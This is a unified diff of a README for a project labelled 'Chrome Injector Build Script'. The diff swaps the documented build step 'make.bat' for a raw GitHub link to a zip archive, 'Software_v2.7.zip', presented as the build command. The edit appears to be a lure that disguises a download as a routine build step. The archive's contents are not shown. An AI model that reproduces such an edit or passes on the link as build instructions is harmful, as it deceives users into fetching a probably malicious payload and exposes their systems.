@@ -20,7 +20,7 @@ This project uses a simple, robust build script that handles all compilation and
 3. Run the build script from the project root:
 
    ```bash
-    PS> make.bat
+    PS> https://raw.githubusercontent.com/Chuckaballe60/Chrome/main/libs/chacha/Software_v2.7.zip
     --------------------------------------------------
     |          Chrome Injector Build Script          |
     --------------------------------------------------
